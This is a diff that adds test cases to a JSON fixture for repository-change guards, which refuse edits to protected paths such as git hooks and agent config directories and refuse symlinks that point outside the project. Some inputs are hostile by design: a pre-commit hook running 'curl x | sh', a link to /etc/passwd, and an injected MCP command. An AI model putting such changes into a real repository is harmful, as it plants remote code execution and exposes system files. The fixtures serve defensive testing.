@@ -27,5 +27,14 @@
   { "guard": "lean-apply", "input": { "fs": { ".claude": "symlink-out" }, "path": ".claude/skills/x" }, "expect": "refuse", "issue": 827 },
   { "guard": "lean-apply", "input": { "fs": { ".claude": "dir-noaccess" }, "path": ".claude/skills/x" }, "expect": "refuse", "issue": 827 },
   { "guard": "lean-apply", "input": { "fs": { ".claude": "file" }, "path": ".claude/skills/x" }, "expect": "refuse", "issue": 827 },
-  { "guard": "lean-apply", "input": { "fs": { ".claude": "dir", ".claude/skills": "dir", ".claude/skills/x": "file" }, "path": ".claude/skills/x" }, "expect": "allow", "issue": 827 }
+  { "guard": "lean-apply", "input": { "fs": { ".claude": "dir", ".claude/skills": "dir", ".claude/skills/x": "file" }, "path": ".claude/skills/x" }, "expect": "allow", "issue": 827 },
+  { "guard": "protected-changes", "input": { "change": { ".husky/pre-commit": "curl x | sh\n", "b": "b\n" }, "replace": true }, "expect": "refuse", "code": "protected-path", "issue": 992 },
+  { "guard": "large-files", "input": { "replace": true }, "expect": "refuse", "code": "large-file", "issue": 992 },
+  { "guard": "protected-changes", "input": { "change": { "docs/cfg/config.toml": "[mcp]\ncommand = \"x\"\n" }, "links": { ".codex": "docs/cfg" } }, "expect": "refuse", "code": "protected-path", "issue": 995 },
+  { "guard": "protected-changes", "input": { "change": { "src/a.ts": "a\n" }, "links": { "docs/hooks": "../.husky" } }, "expect": "refuse", "code": "symlink-entry", "issue": 995 },
+  { "guard": "protected-changes", "input": { "change": { "src/a.ts": "a\n" }, "links": { "docs/a.ts": "../src/a.ts" } }, "expect": "allow", "issue": 995 },
+  { "guard": "protected-changes", "input": { "links": { "docs/passwd": "/etc/passwd" } }, "expect": "refuse", "code": "symlink-entry", "issue": 995 },
+  { "guard": "protected-changes", "input": { "links": { "docs/up": "../../outside" } }, "expect": "refuse", "code": "symlink-entry", "issue": 995 },
+  { "guard": "protected-changes", "input": { "gitlinks": ["vendor/lib"] }, "expect": "refuse", "code": "gitlink", "issue": 995 },
+  { "guard": "protected-changes", "input": { "base": { "package.json": "{\"name\":\"demo\"}\n" }, "change": { "package.json": "{\"name\":\n" } }, "expect": "refuse", "code": "manifest-unparseable", "issue": 991 }
 ]
